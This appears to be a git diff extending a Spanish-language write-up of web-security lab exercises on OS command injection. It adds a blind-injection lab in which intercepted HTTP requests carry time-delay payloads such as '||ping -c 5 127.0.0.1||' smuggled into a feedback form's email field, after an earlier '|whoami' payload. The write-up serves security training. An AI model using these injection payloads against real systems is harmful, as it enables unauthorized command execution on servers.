@@ -77,3 +77,67 @@ Te: trailers
 productId=4&storeId=1|whoami
 ```
 <img src="imagenes/img1.png">
+
+<h2>Laboratorio 2</h2>
+
+En este laboratorio se nos presenta un ejercicio similar pero con la diferencia que no podemos visualizar el resultado en pantalla y la vulnerabilidad se encuentra en la funcion **feedback** para eso vamos a usar algun tipo de Delay para confirmar la existencia de la vulnerabilidad.
+
+```bash
+POST /feedback/submit HTTP/2
+Host: 0a75006803aef804807cdf3c006700fd.web-security-academy.net
+Cookie: session=NgtHApkbHLXlQ5ClHHqbKOItGwTA96IO
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+Origin: https://0a75006803aef804807cdf3c006700fd.web-security-academy.net
+Referer: https://0a75006803aef804807cdf3c006700fd.web-security-academy.net/feedback
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+csrf=1iNVkeiRIvmzSZ9iaEc1fcyM2JoFrkfP&name=qawsedrf&email=q%40gmail.com&subject=s&message=dfgg
+```
+
+Posterior a que interceptamos la peticion comenzamos testeando con nuestros delimitadores haber en que parametro existe la vulnerabilidad cabe recordar que a qui no se nos devuelve una respuesta por lo cual vamos a tener que hacer algun tipo de Delay.
+
+Algunos ejemplos de uso:
+
+```bash
+|| ping -c 10 127.0.0.1 ||
+
+
+& ping -c 10 127.0.0.1 &
+
+
+|| timeout 10 ||
+
+```
+
+```bash
+POST /feedback/submit HTTP/2
+Host: 0a75006803aef804807cdf3c006700fd.web-security-academy.net
+Cookie: session=NgtHApkbHLXlQ5ClHHqbKOItGwTA96IO
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 121
+Origin: https://0a75006803aef804807cdf3c006700fd.web-security-academy.net
+Referer: https://0a75006803aef804807cdf3c006700fd.web-security-academy.net/feedback
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+csrf=1iNVkeiRIvmzSZ9iaEc1fcyM2JoFrkfP&name=dfgv&email=fvcf%40gmail.com||ping+-c+5+127.0.0.1||&subject=cvcfv&message=dcfcf
+
+```
+
+<img src="imagenes/img2.png">
